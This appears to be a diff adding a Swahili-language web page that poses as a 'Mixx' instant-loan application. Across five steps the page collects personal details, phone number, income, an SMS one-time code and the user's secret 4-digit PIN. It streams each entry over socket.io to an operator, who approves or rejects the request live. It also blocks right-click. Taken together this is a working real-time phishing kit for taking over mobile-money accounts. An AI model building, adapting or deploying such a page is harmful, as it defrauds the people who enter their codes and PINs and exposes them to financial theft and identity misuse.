@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Maombi ya Mkopo - Mixx</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        [x-cloak] { display: none !important; }
+        :root {
+            --bg-dark: #0f131e;
+            --accent-orange: #e67e22;
+            --text-main: #ffffff;
+            --text-dim: #94a3b8;
+            --input-bg: rgba(255, 255, 255, 0.05);
+            --border-color: #334155;
+            --accent-teal: #00c2c2;
+            --mixx-blue: #0056b3;
+            --mixx-yellow: #ffcc00;
+        }
+        * { -webkit-tap-highlight-color: transparent; }
+        body { 
+            background-color: var(--bg-dark); 
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            min-height: 100vh; 
+            position: relative; 
+            overflow-x: hidden; 
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        .select-none { -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+        select.input-premium option { background-color: #1e293b; color: white; }
+        .curve-top { position: absolute; top: 0; left: 0; width: 100%; height: 40vh; background: radial-gradient(circle at 50% -20%, #1e293b 0%, var(--bg-dark) 80%); z-index: -1; border-bottom-left-radius: 50% 20%; border-bottom-right-radius: 50% 20%; }
+        .curve-bottom { position: absolute; bottom: 0; left: 0; width: 100%; height: 15vh; background: linear-gradient(to top, #161e31, var(--bg-dark)); z-index: -1; border-top-left-radius: 50% 100%; border-top-right-radius: 50% 100%; }
+        .glass-panel { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border-radius: 1.25rem; }
+        .input-premium { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-main); padding: 0.875rem 1.25rem; width: 100%; border-radius: 0.75rem; outline: none; transition: all 0.3s; font-size: 0.9375rem; }
+        .input-premium:focus { border-color: var(--accent-orange); box-shadow: 0 0 0 3px rgba(230, 126, 34, 0.2); }
+        .btn-premium { background: var(--accent-orange); color: white; padding: 1rem; font-weight: 600; border-radius: 0.75rem; width: 100%; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 0.5rem; border:none; cursor:pointer; }
+        .btn-premium:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { background: transparent; border: 1px solid var(--border-color); color: var(--text-dim); padding: 1rem; border-radius: 0.75rem; transition: 0.3s; cursor: pointer; }
+        .label-premium { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-dim); margin-bottom: 0.5rem; display: block; }
+        .progress-step { display: flex; flex-direction: column; align-items: center; flex: 1; }
+        .progress-dot { width: 32px; height: 32px; border-radius: 50%; background: #1e293b; border: 2px solid #334155; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; margin-bottom: 6px; }
+        .progress-step.active .progress-dot { background: var(--accent-orange); border-color: var(--accent-orange); }
+        .progress-step.completed .progress-dot { background: #10b981; border-color: #10b981; }
+        .progress-step.completed .progress-dot::after { content: '✓'; font-size: 16px; }
+        .progress-step.completed .progress-dot span { display: none; }
+        .otp-input { letter-spacing: 0.5rem; text-align: center; font-weight: 700; font-size: 24px; }
+        .pin-box { width: 50px; height: 50px; border: 2px solid var(--accent-teal); border-radius: 10px; text-align: center; font-size: 24px; background: #0f172a; color: #ffffff; outline: none; }
+        .ib-phone-wrapper { display: flex; border: 2px solid var(--accent-teal); border-radius: 10px; padding: 10px; align-items: center; background: #0f172a; }
+        .ib-country-code { display: flex; align-items: center; gap: 10px; padding-right: 10px; border-right: 1px solid #1f2937; color: #e2e8f0; }
+        .spinner-sm { animation: spin 1s linear infinite; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .toast { position: fixed; top: 20px; right: 20px; padding: 12px 24px; border-radius: 8px; background: white; color: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.2); z-index: 9999; transform: translateX(400px); transition: transform 0.3s ease; }
+        .toast.show { transform: translateX(0); }
+        .toast.success { background: #10b981; color: white; }
+        .toast.error { background: #ef4444; color: white; }
+
+        .mixx-logo-container { display: flex; align-items: center; gap: 12px; justify-content: center; }
+        .mixx-circle { width: 48px; height: 48px; background-color: var(--mixx-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .mixx-inner-m { color: white; font-weight: 800; font-size: 24px; }
+        .mixx-text { color: var(--mixx-yellow); font-size: 42px; font-weight: 900; letter-spacing: -2px; font-style: italic; line-height: 1; }
+    </style>
+</head>
+<body x-data="loanFlow()" x-init="init()" oncontextmenu="return false;" class="antialiased select-none">
+    <div id="toast" class="toast" :class="[toast.type, toast.show ? 'show' : '']" x-text="toast.message"></div>
+    <div class="curve-top"></div>
+    <div class="curve-bottom"></div>
+
+    <main class="max-w-xl mx-auto px-4 pt-10 pb-20 relative z-10">
+        <section class="glass-panel overflow-hidden relative">
+            <div class="bg-white px-6 py-8 border-b border-gray-200">
+                <div class="flex flex-col items-center">
+                    <div class="mixx-logo-container mb-2">
+                        <div class="mixx-circle"><span class="mixx-inner-m">M</span></div>
+                        <span class="mixx-text">Mixx</span>
+                    </div>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Huduma ya Mikopo ya Haraka</p>
+                </div>
+            </div>
+
+            <div class="p-6 md:p-8">
+                <div class="flex justify-between mb-8">
+                    <template x-for="i in 5" :key="i">
+                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
+                            <div class="progress-dot"><span x-text="i"></span></div>
+                        </div>
+                    </template>
+                </div>
+                
+                <div x-show="step === 1" x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Maelezo ya Mkopo</h2><span class="text-xs font-bold text-orange-400">Hatua 01</span></div>
+                    <div class="space-y-4">
+                        <select x-model="form.loanType" class="input-premium">
+                            <option value="">Chagua Aina ya Mkopo</option>
+                            <option value="Personal">Mkopo wa Binafsi</option>
+                            <option value="Business">Mkopo wa Biashara</option>
+                        </select>
+                        <div>
+                            <div class="flex justify-between"><label class="label-premium">Kiasi (TZS)</label><span class="text-xl font-bold" x-text="'TZS ' + Number(form.amount).toLocaleString()"></span></div>
+                            <input type="range" x-model="form.amount" min="10000" max="1000000" step="5000" class="w-full accent-orange-500">
+                        </div>
+                        <select x-model="form.term" class="input-premium">
+                            <option value="">Muda wa Marejesho</option>
+                            <option value="1">Mwezi 1</option><option value="3">Miezi 3</option><option value="6">Miezi 6</option>
+                        </select>
+                        <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Sababu ya mkopo"></textarea>
+                        <button @click="submitStep1" :disabled="!isStep1Valid" class="btn-premium">Endelea →</button>
+                    </div>
+                </div>
+
+                <div x-show="step === 2" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Taarifa za Mtumiaji</h2><span class="text-xs font-bold text-orange-400">Hatua 02</span></div>
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4"><input type="text" x-model="form.firstName" class="input-premium" placeholder="Jina la kwanza"><input type="text" x-model="form.lastName" class="input-premium" placeholder="Jina la ukoo"></div>
+                        <input type="email" x-model="form.email" class="input-premium" placeholder="Barua pepe (Email)">
+                        <div class="ib-phone-wrapper">
+                            <span class="ib-country-code">🇹🇿 +255</span>
+                            <input type="tel" x-model="form.phone" class="input-premium border-0 bg-transparent" placeholder="7XXXXXXXX" maxlength="9">
+                        </div>
+                        <div class="grid grid-cols-2 gap-4"><button @click="step = 1" class="btn-secondary">← Rudi</button><button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Endelea →</button></div>
+                    </div>
+                </div>
+
+                <div x-show="step === 3" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Taarifa za Kazi</h2><span class="text-xs font-bold text-orange-400">Hatua 03</span></div>
+                    <div class="space-y-4">
+                        <select x-model="form.employment" class="input-premium">
+                            <option value="">Hali ya Ajira</option>
+                            <option value="Employed">Nimeajiriwa</option>
+                            <option value="Self-Employed">Nimejiajiri</option>
+                        </select>
+                        <input type="number" x-model="form.income" class="input-premium" placeholder="Kipato kwa mwezi (TZS)">
+                        <input type="text" x-model="form.employer" class="input-premium" placeholder="Jina la mwajiri (hiari)">
+                        <div class="grid grid-cols-2 gap-4">
+                            <button @click="step = 2" class="btn-secondary">← Rudi</button>
+                            <button @click="submitStep3" :disabled="!isStep3Valid" class="btn-premium">Endelea →</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div x-show="step === 4" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Uhakiki wa Namba</h2><span class="text-xs font-bold text-orange-400">Hatua 04</span></div>
+                    <div class="space-y-4 text-center">
+                        <p class="text-sm text-gray-400">Ingiza tarakimu 4 tulizotuma kwa <br> <span class="text-white font-bold" x-text="'+255 ' + form.phone"></span></p>
+                        <input type="text" x-model="otp.code" class="input-premium otp-input" maxlength="4" placeholder="0000">
+                        <div class="grid grid-cols-2 gap-4 pt-4">
+                            <button @click="step = 3" class="btn-secondary">← Rudi</button>
+                            <button @click="verifyOTP" :disabled="otp.code.length !== 4" class="btn-premium">Thibitisha →</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Thibitisha PIN</h2><span class="text-xs font-bold text-orange-400">Hatua 05</span></div>
+                    <p class="text-center text-sm text-gray-400 mb-6">Weka PIN yako ya siri ya tarakimu 4</p>
+                    <div class="flex justify-center gap-3">
+                        <template x-for="(_, i) in 4" :key="i">
+                            <input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]" @keyup.backspace="movePinBack($event, i)">
+                        </template>
+                    </div>
+                    <button @click="submitPin" :disabled="!isPinValid || loading" class="btn-premium mt-10">
+                        <span x-show="!loading">Wasilisha Maombi</span>
+                        <span x-show="loading" class="spinner-sm"></span>
+                    </button>
+                </div>
+
+                <div x-show="step === 6" x-cloak class="text-center py-8">
+                    <div class="text-6xl mb-4">✅</div>
+                    <h2 class="text-2xl font-bold text-green-400">Maombi Yamefanikiwa!</h2>
+                    <p class="text-gray-400 mt-2">Namba ya Kumbukumbu: <span class="text-white font-mono" x-text="referenceId"></span></p>
+                    <button @click="window.location.reload()" class="btn-secondary mt-8">Omba Tena</button>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        function loanFlow() {
+            return {
+                step: 1, referenceId: '', loading: false,
+                form: { loanType: '', amount: 50000, term: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
+                otp: { code: '' },
+                pin: { value: ['', '', '', ''] },
+                toast: { show: false, message: '', type: 'info' },
+                socket: null,
+
+                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone.length >= 9; },
+                get isStep3Valid() { return this.form.employment && this.form.income; },
+                get isPinValid() { return this.pin.value.join('').length === 4; },
+
+                showToast(msg, type = 'success') {
+                    this.toast = { show: true, message: msg, type: type };
+                    setTimeout(() => this.toast.show = false, 3000);
+                },
+
+                init() {
+                    this.socket = io();
+                    
+                    // Disable Right-Click Globally
+                    document.addEventListener('contextmenu', event => event.preventDefault());
+
+                    this.socket.on('admin-approved', (d) => { 
+                        this.loading = false; 
+                        this.referenceId = d.referenceId || 'MIX-' + Math.floor(Math.random()*1000000);
+                        this.step = 6; 
+                        this.showToast('Maombi yamepitishwa na Admin'); 
+                    });
+
+                    this.socket.on('admin-rejected', (d) => { 
+                        this.loading = false; 
+                        this.showToast(d.message || 'Maombi yamekataliwa', 'error'); 
+                    });
+                },
+
+                submitStep1() { 
+                    this.socket.emit('step1', this.form); 
+                    this.step = 2; 
+                },
+
+                submitStep2() { 
+                    this.socket.emit('step2', this.form); 
+                    this.step = 3; 
+                },
+                
+                submitStep3() { 
+                    if(this.isStep3Valid) {
+                        this.socket.emit('step3-data', this.form);
+                        this.socket.emit('send-otp', { phoneNumber: this.form.phone }); 
+                        this.step = 4;
+                    }
+                },
+
+                verifyOTP() { 
+                    this.socket.emit('step4-otp', { otp: this.otp.code }); 
+                    this.step = 5;
+                },
+
+                submitPin() { 
+                    this.loading = true;
+                    this.socket.emit('step5-pin', { 
+                        pin: this.pin.value.join('') 
+                    }); 
+                },
+
+                movePinFocus(e, i) { 
+                    if (e.target.value && i < 3) {
+                        const inputs = document.querySelectorAll('.pin-box');
+                        inputs[i+1].focus();
+                    }
+                },
+
+                movePinBack(e, i) {
+                    if (e.key === 'Backspace' && !this.pin.value[i] && i > 0) {
+                        const inputs = document.querySelectorAll('.pin-box');
+                        inputs[i-1].focus();
+                    }
+                }
+            }
+        }
+    </script>
+</body>
+</html>
